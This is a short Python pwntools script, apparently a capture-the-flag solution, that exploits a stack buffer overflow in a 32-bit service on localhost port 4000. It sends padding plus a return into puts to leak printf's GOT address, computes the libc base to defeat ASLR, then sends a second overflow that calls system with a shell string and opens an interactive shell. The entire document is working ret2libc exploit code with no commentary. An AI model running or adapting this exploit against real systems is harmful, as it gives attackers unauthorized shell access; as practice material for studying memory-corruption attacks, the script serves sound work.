from pwn import *

r = remote('127.0.0.1',4000)
libc = ELF('/lib32/libc.so.6')

print_off = libc.symbols['printf']

system_off = libc.symbols['system']
main = 0x08048618
puts = 0x08048460
printf_got = 0x804a00c

#raw_input('#')

s= 'A'*112 + p32(puts)+p32(main)+p32(printf_got)

r.sendlineafter('Can you find it !?',s)

base = u32(r.recv()[0:4]) - print_off

system = base + system_off

sh = base + 0xed32

raw_input('#')

r.sendline('B'*104+p32(system)+p32(0xdeadbeef)+p32(sh))

r.interactive()
